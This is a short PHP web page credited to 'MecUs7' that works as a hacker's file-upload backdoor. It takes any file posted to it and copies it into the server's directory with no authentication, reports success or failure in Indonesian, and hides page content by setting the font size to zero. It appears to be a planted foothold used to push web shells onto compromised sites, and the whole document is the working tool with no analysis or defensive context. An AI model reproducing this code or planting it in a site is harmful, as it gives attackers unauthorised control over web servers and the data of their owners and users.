<center>
<font face="Courier new" color="black" size="5">| Coded by MecUs7 |</font>
<style>body{font-size: 0;}h1{font-size: 12px}</style>
<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>BERHASIL FILE DI DIR INI</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>GAGAL UPLOAD FILE"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=CROTT!!> <br>"; }__halt_compiler();?></h1></center>
